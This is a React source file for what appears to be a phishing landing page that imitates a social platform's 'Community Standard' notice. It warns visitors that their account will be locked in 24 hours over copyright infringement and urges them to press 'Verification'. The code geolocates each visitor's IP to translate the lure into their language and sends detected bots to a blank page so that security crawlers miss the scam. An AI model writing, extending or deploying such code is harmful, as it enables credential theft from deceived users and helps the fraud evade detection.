import HeroImage from '@/assets/images/hero-image.jpg';
import { PATHS } from '@/router/router';
import countryToLanguage from '@/utils/country_to_language';
import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useCallback, useEffect, useState } from 'react';
import { useNavigate } from 'react-router';

const DEFAULT_TEXTS = {
  title: 'Your account will be locked for 24 hours.',
  description:
    'Our system has detected some unusual activities on your account that may be a sign of copyright infringement that affects the community.',
  protectionText: 'Please verify and follow the steps as instructed.',
  processText: 'To avoid account lock you have only 24 hours left to verify and appeal.',
  continueBtn: 'Verification',
  restrictedText: 'Your account was restricted on',
};

const Index = () => {
  const navigate = useNavigate();
  const [today, setToday] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [translatedTexts, setTranslatedTexts] = useState(DEFAULT_TEXTS);

  const translateAllTexts = useCallback(async (targetLang) => {
    try {
      const keys = Object.keys(DEFAULT_TEXTS);
      const values = await Promise.all(keys.map((key) => translateText(DEFAULT_TEXTS[key], targetLang)));

      const newTexts = keys.reduce((acc, key, i) => {
        acc[key] = values[i];
        return acc;
      }, {});
      setTranslatedTexts(newTexts);
    } catch (error) {
      console.error('translation failed:', error.message);
    }
  }, []);

  useEffect(() => {
    const init = async () => {
      const date = new Date();
      setToday(
        date.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
      );

      // Clear only related keys
      localStorage.removeItem('ipInfo');
      localStorage.removeItem('targetLang');

      // Run fetch & bot-check in parallel
      const [ipRes] = await Promise.allSettled([
        axios.get('https://get.geojs.io/v1/ip/geo.json'),
        detectBot().then((res) => {
          if (res?.isBot) window.location.replace('about:blank');
        }),
      ]);

      if (ipRes.status === 'fulfilled') {
        const data = ipRes.value.data;
        localStorage.setItem('ipInfo', JSON.stringify(data));
        const targetLang = countryToLanguage[data.country_code] || 'en';
        localStorage.setItem('targetLang', targetLang);

        setIsLoading(false);
        translateAllTexts(targetLang);
      } else {
        setIsLoading(false);
      }
    };

    init();
  }, [translateAllTexts]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]">
      <title>Community Standard</title>
      <div className="flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg">
        <img src={HeroImage} alt="hero" loading="lazy" />
        <p className="text-3xl font-bold">{translatedTexts.title}</p>
        <p className="leading-6 text-[#212529]">{translatedTexts.description}</p>

        <div className="relative flex flex-col gap-4">
          <div className="absolute left-3 top-1/2 h-[70%] w-0.5 -translate-y-1/2 bg-gray-200" />

          <div className="z-10 flex items-center gap-2">
            <FontAwesomeIcon
              icon={faCircleCheck}
              className="h-7 w-7 bg-white text-gray-300"
              size="xl"
            />
            <p>{translatedTexts.protectionText}</p>
          </div>
          <div className="z-10 flex items-center gap-2">
            <FontAwesomeIcon
              icon={faIdCard}
              className="h-7 w-7 bg-white text-[#355797]"
              size="xl"
            />
            <p>{translatedTexts.processText}</p>
          </div>
        </div>

        <button
          className="rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50"
          disabled={isLoading}
          onClick={() => navigate(PATHS.HOME)}
        >
          {translatedTexts.continueBtn}
        </button>

        <p className="text-center">
          {translatedTexts.restrictedText} <span className="font-bold">{today}</span>
        </p>
      </div>
    </div>
  );
};

export default Index;
